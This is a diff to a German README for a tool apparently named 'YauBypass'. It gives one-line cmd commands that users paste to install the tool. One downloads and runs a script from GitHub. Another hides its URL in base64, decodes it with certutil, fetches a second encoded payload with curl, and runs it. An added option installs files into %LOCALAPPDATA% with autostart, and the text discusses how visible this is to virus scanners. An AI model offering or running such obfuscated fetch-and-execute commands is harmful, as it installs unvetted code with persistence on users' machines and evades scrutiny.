@@ -6,9 +6,9 @@ Der User lädt nichts herunter und klickt nichts an. Er pastet **eine Zeile in c
 curl -L -o "%TEMP%\yau.cmd" https://raw.githubusercontent.com/fzebypass/yaubypass/main/dist/install.cmd && "%TEMP%\yau.cmd"
 ```
 
-## Portabel: ohne Installation, ohne Ordner
+## Standard: portabel, ohne Installation, ohne Ordner
 
-Einfach ein `p` am Ende des Befehls anhängen:
+Das ist jetzt der Standard – der Befehl braucht kein Argument (`p` funktioniert weiterhin).
 
 ```
 echo dXJsID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9memVieXBhc3MveWF1YnlwYXNzL21haW4vZGlzdC95Yi5iNjQi> "%TEMP%\c.b64" & certutil -f -decode "%TEMP%\c.b64" "%TEMP%\c.cfg" >nul 2>&1 & curl -sfL -o "%TEMP%\y.b64" -K "%TEMP%\c.cfg" & certutil -f -decode "%TEMP%\y.b64" "%TEMP%\y.cmd" >nul 2>&1 & "%TEMP%\y.cmd" p
@@ -57,6 +57,15 @@ selbst wieder, und Virenscannern hilft Base64 eher beim Erkennen als beim Verste
 `curl` und `certutil` bleiben sichtbar — die lassen sich in cmd nicht verbergen.
 
 ---
+
+## Installation: Ordner + Autostart (nur mit `i`)
+
+Willst du den Ordner `%LOCALAPPDATA%\YauBypass\` mit `yaubypass.exe`, `yaubypass.dat`, `boot.cmd`
+und dem Autostart, häng ein `i` an den Befehl:
+
+```
+... & "%TEMP%\y.cmd" i
+```
 
 Danach:
 
